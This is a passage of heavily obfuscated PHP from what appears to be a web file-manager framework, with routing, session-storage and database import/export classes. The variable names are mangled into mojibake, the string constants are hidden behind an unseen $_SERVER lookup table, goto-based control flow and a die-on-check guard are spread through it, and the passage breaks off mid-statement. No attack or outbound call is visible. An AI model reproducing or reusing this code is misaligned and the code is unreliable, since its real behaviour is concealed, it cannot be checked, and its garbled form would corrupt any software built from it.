$«Å×˜¥¯[1859] . $œ„Òëœ . $«Å×˜¥¯[1860] . $«Å×˜¥¯[59]; } } if ($è‹€¯–„) { Hook::trigger($«Å×˜¥¯[1854]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\57\135\53", "\x3a\156\x75\x6d" => "\x5b\60\x2d\71\135\53", "\72\x61\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¢–­İ†¡, $õÀ–ìÎ) { $Ä²Şü­ =& $_SERVER[¤øïŠ‹²]; if ($¢–­İ†¡ == $Ä²Şü­[1861]) { $©“ôıæ = array_map($Ä²Şü­[1862], $õÀ–ìÎ[0]); $¢·½¤ Õ = strpos($õÀ–ìÎ[1], $Ä²Şü­[8]) === 0 ? $õÀ–ìÎ[1] : $Ä²Şü­[8] . $õÀ–ìÎ[1]; $šÆç†£Ï = $õÀ–ìÎ[2]; } else { $©“ôıæ = null; $¢·½¤ Õ = strpos($õÀ–ìÎ[0], $Ä²Şü­[8]) === 0 ? $õÀ–ìÎ[0] : $Ä²Şü­[8] . $õÀ–ìÎ[0]; $šÆç†£Ï = $õÀ–ìÎ[1]; } array_push(self::$maps, $©“ôıæ); array_push(self::$routes, $¢·½¤ Õ); array_push(self::$methods, strtoupper($¢–­İ†¡)); array_push(self::$callbacks, $šÆç†£Ï); } public static function error($îõã¸ç¸) { self::$errorCallback = $îõã¸ç¸; } public static function haltOnMatch($‰¾‹òûŒ = true) { self::$halts = $‰¾‹òûŒ; } public static function dispatch() { $Ç…øµ»ú =& $_SERVER[¤øïŠ‹²]; $ÄµùÄú® = parse_url($_SERVER[$Ç…øµ»ú[1863]], PHP_URL_PATH); $Æµá¯Î´ = $_SERVER[$Ç…øµ»ú[174]]; $·¨Ø«ğÇ = array_keys(static::$patterns); $Ñó’Ö• = array_values(static::$patterns); $ë¦øõáã = !1; self::$routes = preg_replace($Ç…øµ»ú[1415], $Ç…øµ»ú[8], self::$routes); if (in_array($ÄµùÄú®, self::$routes)) { $ú”àÜØ• = array_keys(self::$routes, $ÄµùÄú®); foreach ($ú”àÜØ• as $š÷ÔñŠ) { if (self::$methods[$š÷ÔñŠ] == $Æµá¯Î´ || self::$methods[$š÷ÔñŠ] == $Ç…øµ»ú[1864] || in_array($Æµá¯Î´, self::$maps[$š÷ÔñŠ])) { $ë¦øõáã = !0; if (!is_object(self::$callbacks[$š÷ÔñŠ])) { $Ô³¢íñÀ = explode($Ç…øµ»ú[8], self::$callbacks[$š÷ÔñŠ]); $µñÒÙÖÅ = end($Ô³¢íñÀ); $¢ô´Ì¡¤ = explode($Ç…øµ»ú[1345], $µñÒÙÖÅ); $”Õ„°‰³ = new $¢ô´Ì¡¤[0](); $”Õ„°‰³->{$¢ô´Ì¡¤[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$š÷ÔñŠ]); if (self::$halts) { return; } } } } } else { $ñ€¾ĞÖ­ = 0; foreach (self::$routes as $š÷ÔñŠ) { if (strpos($š÷ÔñŠ, $Ç…øµ»ú[4]) !== !1) { $š÷ÔñŠ = str_replace($·¨Ø«ğÇ, $Ñó’Ö•, $š÷ÔñŠ); } if (preg_match($Ç…øµ»ú[1865] . $š÷ÔñŠ . $Ç…øµ»ú[1866], $ÄµùÄú®, $—î¹¶±®)) { if (self::$methods[$ñ€¾ĞÖ­] == $Æµá¯Î´ || self::$methods[$ñ€¾ĞÖ­] == $Ç…øµ»ú[1864] || !empty(self::$maps[$ñ€¾ĞÖ­]) && in_array($Æµá¯Î´, self::$maps[$ñ€¾ĞÖ­])) { $ë¦øõáã = !0; array_shift($—î¹¶±®); if (!is_object(self::$callbacks[$ñ€¾ĞÖ­])) { $Ô³¢íñÀ = explode($Ç…øµ»ú[8], self::$callbacks[$ñ€¾ĞÖ­]); $µñÒÙÖÅ = end($Ô³¢íñÀ); $¢ô´Ì¡¤ = explode($Ç…øµ»ú[1345], $µñÒÙÖÅ); $”Õ„°‰³ = new $¢ô´Ì¡¤[0](); if (!method_exists($”Õ„°‰³, $¢ô´Ì¡¤[1])) { echo $Ç…øµ»ú[1867]; } else { call_user_func_array(array($”Õ„°‰³, $¢ô´Ì¡¤[1]), $—î¹¶±®); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ñ€¾ĞÖ­], $—î¹¶±®); if (self::$halts) { return; } } } } $ñ€¾ĞÖ­++; } } if ($ë¦øõáã == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ô°Ş¡Ã =& $_SERVER[¤øïŠ‹²]; header($_SERVER[$ô°Ş¡Ã[1868]] . $ô°Ş¡Ã[1869]); echo $ô°Ş¡Ã[1870]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ç…øµ»ú[1863]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Á¬ÌË· =& $_SERVER[¤øïŠ‹²]; static $™éÕµš’ = false; if ($™éÕµš’) { return $™éÕµš’; } $æĞáÍÜ“ = $GLOBALS[$Á¬ÌË·[6]][$Á¬ÌË·[436]]; self::$sessionTime = $æĞáÍÜ“[$Á¬ÌË·[1871]]; $±ÒŸ„ = isset($GLOBALS[$Á¬ÌË·[1872]]) ? $GLOBALS[$Á¬ÌË·[1872]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($±ÒŸ„)) { self::$sessionSign = Cookie::get($±ÒŸ„); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($±ÒŸ„, self::$sessionSign, self::$sessionTime); $éõï®Éš = $æĞáÍÜ“[$Á¬ÌË·[1873]]; $´¸±Ü” = $æĞáÍÜ“[$éõï®Éš]; $ö »Ñ‹ = $æĞáÍÜ“[$Á¬ÌË·[937]]; switch ($éõï®Éš) { case $Á¬ÌË·[21]: self::$handle = Model($Á¬ÌË·[938]); break; case $Á¬ÌË·[939]: self::$handle = new CacheRedis($´¸±Ü”, $ö »Ñ‹); break; case $Á¬ÌË·[940]: self::$handle = new CacheMemcached($´¸±Ü”, $ö »Ñ‹); break; case $Á¬ÌË·[243]: $´¸±Ü”[$Á¬ÌË·[98]] = $´¸±Ü”[$Á¬ÌË·[98]] . $Á¬ÌË·[1874]; self::$handle = new CacheFile($´¸±Ü”, $ö »Ñ‹); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$Á¬ÌË·[1611]]) || time() - self::$data[$Á¬ÌË·[1611]] >= 5) { self::dataSave(); } } $™éÕµš’ = new self(); return $™éÕµš’; } public static function getBySign($ĞÃØÓ) { $õàŞ­ä– = self::$handle->get($ĞÃØÓ); $õàŞ­ä– = unserialize($õàŞ­ä–); return is_array($õàŞ­ä–) ? $õàŞ­ä– : array(); } public static function setBySign($şáÊã’û, $­Æ–èá±) { self::$sessionSign = $şáÊã’û; self::$data = $­Æ–èá±; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[¤øïŠ‹²][1611]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($éÏÓ‹ó‹ = false) { if ($éÏÓ‹ó‹) { self::$sessionSign = $éÏÓ‹ó‹; } self::init(); return self::$sessionSign; } public static function set($„Ü’†”, $¤í¢õ‘Ş = false) { self::init(); if (is_array($„Ü’†”)) { foreach ($„Ü’†” as $Ì­Û¼¸¿ => $šª¹İ¡) { array_set_value(self::$data, $Ì­Û¼¸¿, $šª¹İ¡); } } else { array_set_value(self::$data, $„Ü’†”, $¤í¢õ‘Ş); } self::dataSave(); } public static function get($É­Şˆ€¡ = false) { self::init(); if (!$É­Şˆ€¡) { return self::$data; } return array_get_value(self::$data, $É­Şˆ€¡); } public static function remove($Ìæ©²©¾) { self::init(); unset(self::$data[$Ìæ©²©¾]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¤øïŠ‹²][946])) { self::$handle->clearTimeout(); } } } goto cº¬ÜƒĞ«; aÇÅë¾‰˜ã: define($_SERVER[¤øïŠ‹²][706], $_SERVER[¤øïŠ‹²][707]); $hvyksjaucr = $_SERVER[¤øïŠ‹²][708]; if (strlen($hvyksjaucr) < $_SERVER[¤øïŠ‹²][709]) { die; } goto aåï‹¶Š©’; cÄà¢ …’ñ: class DbManage { function __construct($‘£¹ğùù = array()) { $£Éƒå§ò =& $_SERVER[¤øïŠ‹²]; if (empty($‘£¹ğùù)) { $‘£¹ğùù = $GLOBALS[$£Éƒå§ò[6]][$£Éƒå§ò[21]]; } $this->database = $‘£¹ğùù; } public function model($«ÅÊÒØ­ = '') { return new ModelBase($«ÅÊÒØ­, $_SERVER[¤øïŠ‹²][12], $this->database); } public function db($Ñéç•ø = false) { $Ñ©ØÃ¸¢ =& $_SERVER[¤øïŠ‹²]; $‚êÈÙ» = array_change_key_case($this->database); if ($this->dbType() == $Ñ©ØÃ¸¢[13] || !$Ñéç•ø) { return $this->model()->db(); } $ûê†ÆçÏ = $‚êÈÙ»[$Ñ©ØÃ¸¢[1088]]; $‚êÈÙ»[$Ñ©ØÃ¸¢[1088]] = $Ñ©ØÃ¸¢[12]; if ($‚êÈÙ»[$Ñ©ØÃ¸¢[1083]] == $Ñ©ØÃ¸¢[1080]) { $¬¬“½§Ğ = $‚êÈÙ»[$Ñ©ØÃ¸¢[1089]]; $‚êÈÙ»[$Ñ©ØÃ¸¢[1089]] = substr($¬¬“½§Ğ, 0, strrpos($¬¬“½§Ğ, $Ñ©ØÃ¸¢[1175])); } $this->database = $‚êÈÙ»; $–ˆá˜®¯ = $this->model()->db(); try { $Íê Ó‘Š = $–ˆá˜®¯->execute("\163\x68\x6f\167\x20\144\x61\164\x61\x62\141\163\x65\x73\x20\154\151\x6b\145\x20\47{$ûê†ÆçÏ}\47"); } catch (Exception $í˜Û‚‡) { } if (!$Íê Ó‘Š) { $–ˆá˜®¯->execute("\x63\162\x65\141\x74\x65\40\x64\x61\164\141\x62\141\x73\x65\x20\x60{$ûê†ÆçÏ}\140"); } $‚êÈÙ»[$Ñ©ØÃ¸¢[1088]] = $ûê†ÆçÏ; if ($‚êÈÙ»[$Ñ©ØÃ¸¢[1083]] == $Ñ©ØÃ¸¢[1080]) { $‚êÈÙ»[$Ñ©ØÃ¸¢[1089]] .= $Ñ©ØÃ¸¢[1175] . $ûê†ÆçÏ; } $this->database = $‚êÈÙ»; $–ˆá˜®¯->execute("\165\163\x65\x20\x60{$ûê†ÆçÏ}\140"); return $–ˆá˜®¯; } public function createTable($òŸß¤õ², &$Ú«ŒŞ—Á) { $Š¢šÅÛğ =& $_SERVER[¤øïŠ‹²]; if (!IO::exist($òŸß¤õ²)) { show_json(LNG($Š¢šÅÛğ[1176]), !1); } $äÊ©ßÀñ = $this->model()->db(); $õßËÔ¡ = sqlSplit(IO::getContent($òŸß¤õ²)); foreach ($õßËÔ¡ as $ı‹ÏÖ˜‡) { $Œ¢³Ø”š = stripos($ı‹ÏÖ˜‡, $Š¢šÅÛğ[1177]) === 0; if ($Œ¢³Ø”š) { $Ú«ŒŞ—Á->task[$Š¢šÅÛğ[1178]] += 1; } $äÊ©ßÀñ->execute($ı‹ÏÖ˜‡); if ($Œ¢³Ø”š) { preg_match($Š¢šÅÛğ[1179], $ı‹ÏÖ˜‡, $ÇÅ‚æ©›); $Ú«ŒŞ—Á->task[$Š¢šÅÛğ[1180]] = $ÇÅ‚æ©›[1]; $Ú«ŒŞ—Á->update(1); } } } public function insertTable($¶·¤¯², &$•¯•ÛÔ) { $®º«šéÖ =& $_SERVER[¤øïŠ‹²]; $äâ¬ÉÉ” = $this->model()->db(); $’–Šı§ = $Ï……Ûò ? array($Ï……Ûò) : $äâ¬ÉÉ”->getTables(); foreach ($¶·¤¯² as $Ìáå¨â) { $Ï……Ûò = basename($Ìáå¨â, $®º«šéÖ[894]); if (!in_array($Ï……Ûò, $’–Šı§)) { continue; } $•¯•ÛÔ->task[$®º«šéÖ[1180]] = $Ï……Ûò; if ($Ï……Ûò == $®º«šéÖ[888]) { continue; } if (get_filesize($Ìáå¨â) == 0) { continue; } $Ô¤ãÖâŞ = $this->sqlToDb($Ìáå¨â, $•¯•ÛÔ); if (!$Ô¤ãÖâŞ) { show_json(LNG($®º«šéÖ[1181]) . "\133{$Ï……Ûò}\x5d", !1); } } } public function sqlFromDb($ô®ı“—³, $’Õìö˜ğ, &$çÕÉšÀ, $ ‰¯¶“™ = '') { if ($çÕÉšÀ) { $çÕÉšÀ->task[$_SERVER[¤øïŠ‹²][1180]] = $ô®ı“—³; } $İÕÈÁ¶Ä = $this->model($ô®ı“—³); $»„’ = 0; $è¯™Û› = 0; $èì²Ãò• = 10000; $ÍöĞş = fopen($’Õìö˜ğ, $_SERVER[¤øïŠ‹²][1182]); $ÙÉÂñÖ = $İÕÈÁ¶Ä->getPk(); $“æüä²Ù = $İÕÈÁ¶Ä->getDbFields(); $ÜêÒœáü = $_SERVER[¤øïŠ‹²][12]; if ($GLOBALS[$_SERVER[¤øïŠ‹²][893]] && in_array($ô®ı“—³, array($_SERVER[¤øïŠ‹²][1183], $_SERVER[¤øïŠ‹²][1184]))) { $ÜêÒœáü = $ô®ı“—³; } do { $ÏÓìŒ®• = array($ÙÉÂñÖ => array($_SERVER[¤øïŠ‹²][1130], $è¯™Û›)); $¾ª½É²© = $İÕÈÁ¶Ä->where($ÏÓìŒ®•)->field($“æüä²Ù)->order($ÙÉÂñÖ . $_SERVER[¤øïŠ‹²][1185])->limit($èì²Ãò•)->select(); $¾ª½É²© = !empty($¾ª½É²©) ? $¾ª½É²© : array(); if (!($Ø˜À£ô‰ = count($¾ª½É²©))) { break; } $ğöæ Ÿ = end($¾ª½É²©); $è¯™Û› = $ğöæ Ÿ[$ÙÉÂñÖ]; $—şÓ‹Ã = array(); foreach ($¾ª½É²© as $°úùåó‹) { if ($ÜêÒœáü) { if ($ô®ı“—³ == $_SERVER[¤øïŠ‹²][1183]) { if ($°úùåó‹[$_SERVER[¤øïŠ‹²][33]] == $_SERVER[¤øïŠ‹²][1186]) { $Í¨éÈÔß = json_decode($°úùåó‹[$_SERVER[¤øïŠ‹²][462]], !0); if ($Í¨éÈÔß[$_SERVER[¤øïŠ‹²][32]] == $GLOBALS[$_SERVER[¤øïŠ‹²][893]] && $Í¨éÈÔß[$_SERVER[¤øïŠ‹²][851]] != 1) { continue; } } } else { if ($°úùåó‹[$_SERVER[¤øïŠ‹²][33]] == $_SERVER[¤øïŠ‹²][1187] && $°úùåó‹[$_SERVER[¤øïŠ‹²][106]] == $_SERVER[¤øïŠ‹²][889]) { continue; } } } if ($ ‰¯¶“™) { $°úùåó‹[$_SERVER[¤øïŠ‹²][98]] = "\173\x69\157\72{$ ‰¯¶“™}\x7d" . substr($°úùåó‹[$_SERVER[¤øïŠ‹²][98]], strlen("\173\151\157\72{$°úùåó‹[$_SERVER[¤øïŠ‹²][927]]}\175")); $°úùåó‹[$_SERVER[¤øïŠ‹²][927]] = $ ‰¯¶“™; } $—şÓ‹Ã[] = $_SERVER[¤øïŠ‹²][1188] . $this->sqlEncode($°úùåó‹) . $_SERVER[¤øïŠ‹²][1189]; } $èşùŞÖ = "\x49\116\x53\x45\x52\x54\x20\x49\x4e\x54\117\40\x60{$ô®ı“—³}\x60\x20\x28\140" . implode($_SERVER[¤øïŠ‹²][1190], $“æüä²Ù) . $_SERVER[¤øïŠ‹²][1191]; fwrite($ÍöĞş, $èşùŞÖ . implode($_SERVER[¤øïŠ‹²][1192], $—şÓ‹Ã) . $_SERVER[¤øïŠ‹²][85] . PHP_EOL); $»„’ += $Ø˜À£ô‰; if ($çÕÉšÀ) { $çÕÉšÀ->update($Ø˜À£ô‰); } } while ($èì²Ãò• == $Ø˜À£ô‰); fclose($ÍöĞş); return $»„’; } public function sqlToDb($Ì—ÈëÈ‚, &$¨ÜÃ·êã) { $ÄÔÒÄ¸ =& $_SERVER[¤øïŠ‹²]; $ÇóÉÈÔ– = $this->model()->db(); $Í»´†à¡ = @fopen($Ì—ÈëÈ‚, $ÄÔÒÄ¸[1193]); if (!$Í»´†à¡) { return !1; } $€İÙèÃğ = 0; $àŞÍ«£î = $ÄÔÒÄ¸[12]; $õï¼„¯Ğ = array(); $µ°‡¥ê = $this->dbType(); $ØûÅÌë = $µ°‡¥ê == $ÄÔÒÄ¸[13] ? 500 : 2000; $Ú¹¤ïÚÓ = basename($Ì—ÈëÈ‚, $ÄÔÒÄ¸[894]); $Ä‹ëä ğ = 0; $ƒ§“ï¦ = 4194304; while (!feof($Í»´†à¡)) { $ÊÂß¥–î = trim(fgets($Í»´†à¡)); if (!$ÊÂß¥–î) { continue; } $ÒÙîİ = $this->sqlDecode($ÊÂß¥–î, $µ°‡¥ê, $Ú¹¤ïÚÓ); if (stripos($ÒÙîİ, $ÄÔÒÄ¸[442]) === 0) { if (!$àŞÍ«£î) { $àŞÍ«£î = $ÒÙîİ . $ÄÔÒÄ¸[53]; } continue; } if ($¨ÜÃ·êã) { $¨ÜÃ·êã->task[$ÄÔÒÄ¸[1178]] += 1; } $€İÙèÃğ++; $õï¼„¯Ğ[] = rtrim(rtrim(trim($ÒÙîİ), $ÄÔÒÄ¸[50]), $ÄÔÒÄ¸[85]); $©ê§Şê = null; $£˜Æòí = strlen($ÒÙîİ); $Ä‹ëä ğ += $£˜Æòí; $à£›ÄÅı = strlen($àŞÍ«£î) + $Ä‹ëä ğ + (count($õï¼„¯Ğ) - 1); if ($à£›ÄÅı >= $ƒ§“ï¦) { $©ê§Şê = array_pop($õï¼„¯Ğ); if ($€İÙèÃğ > 1) { $€İÙèÃğ--; } } if ($€İÙèÃğ >= $ØûÅÌë || $©ê§Şê) { $ÒÙîİ = $àŞÍ«£î . implode($ÄÔÒÄ¸[50], $õï¼„¯Ğ); if (!$ÇóÉÈÔ–->execute($ÒÙîİ)) { return !1; } if ($¨ÜÃ·êã) { $¨ÜÃ·êã->update($€İÙèÃğ); } $õï¼„¯Ğ = array(); $€İÙèÃğ = 0; $Ä‹ëä ğ = 0; if ($©ê§Şê) { $õï¼„¯Ğ = array($©ê§Şê); $€İÙèÃğ = 1; $Ä‹ëä ğ = $£˜Æòí; } } } fclose($Í»´†à¡); if (!empty($õï¼„¯Ğ)) { $ÒÙîİ = $àŞÍ«£î . implode($ÄÔÒÄ¸[50], $õï¼„¯Ğ); if (!$ÇóÉÈÔ–->execute($ÒÙîİ)) { return !1; } if ($¨ÜÃ·êã) { $¨ÜÃ·êã->update($€İÙèÃğ); } } return !0; } public function dropTable($Ó„³®¼ú = null) { $ğ¼˜›ö· =& $_SERVER[¤øïŠ‹²]; $×¹×€Œ° = $this->model()->db(); $¹£³ğ = $Ó„³®¼ú ? array($Ó„³®¼ú) : $×¹×€Œ°->getTables(); if (!$¹£³ğ) { return; } foreach ($¹£³ğ as $Ó„³®¼ú) { if ($Ó„³®¼ú) { $Ó„³®¼ú = strtolower($Ó„³®¼ú); } else { continue; } $×¹×€Œ°->execute($ğ¼˜›ö·[1194] . $this->escapeName($Ó„³®¼ú) . $ğ¼˜›ö·[1195]); } } private function sqlEncode($³´ˆòù) { $Êå±¸Å™ =& $_SERVER[¤øïŠ‹²]; $¤İòúğ¾ = array(); foreach ($³´ˆòù as $ˆÚó Â„) { if (is_array($ˆÚó Â„)) { $ˆÚó Â„ = json_encode_force($ˆÚó Â„); } $ˆÚó Â„ = addslashes($ˆÚó Â„); $ˆÚó Â„ = str_replace(array($Êå±¸Å™[1196], $Êå±¸Å™[59], $Êå±¸Å™[429]), array($Êå±¸Å™[1197], $Êå±¸Å™[1198], $Êå±¸Å™[1199]), $ˆÚó Â„); $¤İòúğ¾[] = $ˆÚó Â„; } return $Êå±¸Å™[68] . implode($Êå±¸Å™[1200], $¤İòúğ¾) . $Êå±¸Å™[68]; } private function sqlDecode($š½Äü›Í, $ŸàÂÍŸÈ, $ªŞ´øİÛ = '') { $Š‹šÊÑ¹ =& $_SERVER[¤øïŠ‹²]; $š½Äü›Í = str_replace(array($Š‹šÊÑ¹[1197], $Š‹šÊÑ¹[1198], $Š‹šÊÑ¹[1199]), array($Š‹šÊÑ¹[1196], $Š‹šÊÑ¹[59], $Š‹šÊÑ¹[429]), $š½Äü›Í); if ($ŸàÂÍŸÈ == $Š‹šÊÑ¹[13]) { $š½Äü›Í = str_ireplace($Š‹šÊÑ¹[1201], $Š‹šÊÑ¹[69], $š½Äü›Í); $š½Äü›Í = stripslashes($š½Äü›Í); } return preg_replace($Š‹šÊÑ¹[1202], $Š‹šÊÑ¹[12], $š½Äü›Í); if ($ŸàÂÍŸÈ == $Š‹šÊÑ¹[13]) { return $ªŞ´øİÛ != $Š‹šÊÑ¹[888] ? stripslashes($š½Äü›Í) : $š½Äü›Í; } if ($ªŞ´øİÛ == $Š‹šÊÑ¹[888]) { $š½Äü›Í = str_replace($Š‹šÊÑ¹[1203], $Š‹šÊÑ¹[130], stripslashes($š½Äü›Í)); } return $š½Äü›Í; } public function getSqlFile($À÷±ÊÍÁ = '') { $ã‹º‹÷ =& $_SERVER[¤øïŠ‹²]; $Ã°÷ƒ©É = $this->dbType(!0); $ø©´‰Ùè = CONTROLLER_DIR . "\151\156\x73\x74\141\x6c\154\x2f\144\141\x74\141\x2f{$Ã°÷ƒ©É}\56\163\161\154"; if (!file_exists($ø©´‰Ùè)) { return !1; } $Ÿ…óóºá = file_get_contents($ø©´‰Ùè); $ö¡¡š¤Ñ = $ã‹º‹÷[1204] . ($Ã°÷ƒ©É == $ã‹º‹÷[905] ? $ã‹º‹÷[1205] : $ã‹º‹÷[1206]) . $ã‹º‹÷[1207]; preg_match_all($ö¡¡š¤Ñ, $Ÿ…óóºá, $æ²¦‹©ô); $Îø¹Ğ×ş = $æ²¦‹©ô[1]; $‰ÈèÙÕ¯ = $this->model()->db(); $ŒÀŞƒê = $‰ÈèÙÕ¯->getTables(); $ÏÖ€‘Îİ = TEMP_FILES . $ã‹º‹÷[1208] . date($ã‹º‹÷[272]) . $ã‹º‹÷[8]; del_dir($ÏÖ€‘Îİ); mk_dir($ÏÖ€‘Îİ); $ª³øó»Ÿ = $ÏÖ€‘Îİ . $ã‹º‹÷[1209]; $ˆéş×ÃÊ = $ÏÖ€‘Îİ . $ã‹º‹÷[1210]; $óâ™»èå = $Ã°÷ƒ©É == $ã‹º‹÷[13] ? $ã‹º‹÷[905] : $ã‹º‹÷[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\141\154\x6c\x2f\144\x61\x74\141\57{$óâ™»èå}\56\x73\161\154", $ÏÖ€‘Îİ); @touch($ÏÖ€‘Îİ . $Ã°÷ƒ©É . $ã‹º‹÷[894]); $óşÙ¦¥û = fopen($ª³øó»Ÿ, $ã‹º‹÷[1182]); $Ã•Õ‹¤Á = fopen($ˆéş×ÃÊ, $ã‹º‹÷[1182]); if ($Ã°÷ƒ©É == $ã‹º‹÷[13]) { $ŒÀŞƒê = array_diff($ŒÀŞƒê, array($ã‹º‹÷[886], $ã‹º‹÷[887])); $ÄÖß…Œ = array($ã‹º‹÷[1211], $ã‹º‹÷[1212], $ã‹º‹÷[1213]); fwrite($Ã•Õ‹¤Á, implode(PHP_EOL, $ÄÖß…Œ) . PHP_EOL . PHP_EOL); foreach ($ŒÀŞƒê as $—É‹àÙ¢) { $šæø•¯ = $this->sqlFromSqlite($—É‹àÙ¢); if (!$šæø•¯[$ã‹º‹÷[13]]) { continue; } fwrite($Ã•Õ‹¤Á, $šæø•¯[$ã‹º‹÷[13]] . PHP_EOL . PHP_EOL); if (!in_array($—É‹àÙ¢, $Îø¹Ğ×ş)) { fwrite($óşÙ¦¥û, $šæø•¯[$ã‹º‹÷[905]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ŒÀŞƒê as $—É‹àÙ¢) { $šæø•¯ = $this->sqlFromMysql($—É‹àÙ¢); if (!$šæø•¯[$ã‹º‹÷[905]]) { continue; } fwrite($óşÙ¦¥û, $šæø•¯[$ã‹º‹÷[905]] . PHP_EOL . PHP_EOL); if (!in_array($—É‹àÙ¢, $Îø¹Ğ×ş)) { fwrite($Ã•Õ‹¤Á, $šæø•¯[$ã‹º‹÷[13]] . PHP_EOL . PHP_EOL); } } } fclose($óşÙ¦¥û); fclose($Ã•Õ‹¤Á); $Ÿ…óóºá = array($ã‹º‹÷[905] => $ª³øó»Ÿ, $ã‹º‹÷[13] => $ˆéş×ÃÊ); return $À÷±ÊÍÁ ? $Ÿ…óóºá[$À÷±ÊÍÁ] : $Ÿ…óóºá; } public function dbType($÷¯‹û¡è = false) { $Í¦¿“µ¥ =& $_SERVER[¤øïŠ‹²]; $å¼¦ØÔ˜ = $÷¯‹û¡è ? $GLOBALS[$Í¦¿“µ¥[6]][$Í¦¿“µ¥[21]] : $this->database; $å¼¦ØÔ˜ = array_change_key_case($å¼¦ØÔ˜); $¹ğ×åóˆ = $å¼¦ØÔ˜[$Í¦¿“µ¥[1083]]; if ($¹ğ×åóˆ == $Í¦¿“µ¥[1080]) { $ş¹†Ñ“ã = explode($Í¦¿“µ¥[4], $å¼¦ØÔ˜[$Í¦¿“µ¥[1089]]); $¹ğ×åóˆ = $ş¹†Ñ“ã[0]; } $«ìàÑäª = array($Í¦¿“µ¥[1214] => $Í¦¿“µ¥[13], $Í¦¿“µ¥[1028] => $Í¦¿“µ¥[905]); if (isset($«ìàÑäª[$¹ğ×åóˆ])) { $¹ğ×åóˆ = $«ìàÑäª[$¹ğ×åóˆ]; } return $¹ğ×åóˆ; } public function sqlFromMysql($¨¤Ñ¢, $ÒË¼†§¿ = '') { $şÜÖ£Ïß =& $_SERVER[¤øïŠ‹²]; $ˆ£ÁåØ = array($şÜÖ£Ïß[905] => $şÜÖ£Ïß[12], $şÜÖ£Ïß[13] => $şÜÖ£Ïß[12]); $©Ì¨¼±à = $this->escapeName($¨¤Ñ¢); $û¾ºÚ«’ = $this->escapeName($¨¤Ñ¢, $şÜÖ£Ïß[13]); $Œ‹ïÈ = $this->model()->db(); $üƒª­Ç = $Œ‹ïÈ->query("\x73\150\x6f\x77\40\x63\x72\x65\141\x74\145\40\164\x61\142\154\x65\40{$©Ì¨¼±à}\x3b"); if (!$üƒª­Ç || !$üƒª­Ç[0]) { return !1; } $€Ñ•² = _get($üƒª­Ç[0], $şÜÖ£Ïß[1215], $şÜÖ£Ïß[12]); if (!$€Ñ•²) { return !1; } $”·¶³ş  = "\x44\122\117\120\40\124\101\102\x4c\105\40\111\x46\x20\105\x58\111\123\x54\123\40{$©Ì¨¼±à}\x3b" . PHP_EOL . $€Ñ•² . $şÜÖ£Ïß[85]; if ($ÒË¼†§¿ == $şÜÖ£Ïß[905]) { return $”·¶³ş ; } $ˆ£ÁåØ[$şÜÖ£Ïß[905]] = $”·¶³ş ; $¶ÍÀÓÖ‹ = array_change_key_case($GLOBALS[$şÜÖ£Ïß[6]][$şÜÖ£Ïß[21]]); $®ùã¯àº = $¶ÍÀÓÖ‹[$şÜÖ£Ïß[1088]]; $ö‰Ë´«ş = $şÜÖ£Ïß[1216] . $®ùã¯àº . "\47\x20\101\x4e\104\40\x54\x41\x42\114\105\137\116\101\x4d\105\40\75\40{$û¾ºÚ«’}\x3b"; $òè€òÌ = "\123\110\x4f\x57\40\111\116\104\x45\130\40\106\122\x4f\115\40{$©Ì¨¼±à}\x3b"; $•€…ı˜ö = $Œ‹ïÈ->query($ö‰Ë´«ş); if (empty($•€…ı˜ö)) { return $ÒË¼†§¿ ? $ˆ£ÁåØ[$ÒË¼†§¿] : $ˆ£ÁåØ; } $“üÖ× = $Œ‹ïÈ->query($òè€òÌ); $î”–Ê‹û = $şÜÖ£Ïß[12]; $Ô·©¹ÙÕ = array(); foreach ($“üÖ× as $ÙÅ­²È) { if (!$î”–Ê‹û && $ÙÅ­²È[$şÜÖ£Ïß[1217]] == $şÜÖ£Ïß[1218]) { $î”–Ê‹û = $ÙÅ­²È[$şÜÖ£Ïß[1219]]; } if (isset($Ô·©¹ÙÕ[$ÙÅ­²È[$şÜÖ£Ïß[1217]]])) { $Ô·©¹ÙÕ[$ÙÅ­²È[$şÜÖ£Ïß[1217]]][$şÜÖ£Ïß[1220]][] = $ÙÅ­²È[$şÜÖ£Ïß[1219]]; continue; } $Ô·©¹ÙÕ[$ÙÅ­²È[$şÜÖ£Ïß[1217]]] = array($şÜÖ£Ïß[1221] => $ÙÅ­²È[$şÜÖ£Ïß[1217]], $şÜÖ£Ïß[1220] => array($ÙÅ­²È[$şÜÖ£Ïß[1219]]), $şÜÖ£Ïß[1222] => $ÙÅ­²È[$şÜÖ£Ïß[1223]] == $şÜÖ£Ïß[102] ? 0 : 1); } $ºÑÒ…¶… = array(); foreach ($Ô·©¹ÙÕ as $ÙÅ­²È) { $ßê³éáø = $ÙÅ­²È[$şÜÖ£Ïß[1221]] == $şÜÖ£Ïß[1218]; $¦Ç–å× = $ÙÅ­²È[$şÜÖ£Ïß[1222]] == $şÜÖ£Ïß[102] && !$ßê³éáø ? $şÜÖ£Ïß[1224] : $şÜÖ£Ïß[12]; $Œ¬¢âùì = $şÜÖ£Ïß[1225] . $¨¤Ñ¢ . $şÜÖ£Ïß[11] . ($ßê³éáø ? $şÜÖ£Ïß[1226] : $ÙÅ­²È[$şÜÖ£Ïß[1221]]); $ Ä™¸Â¨ 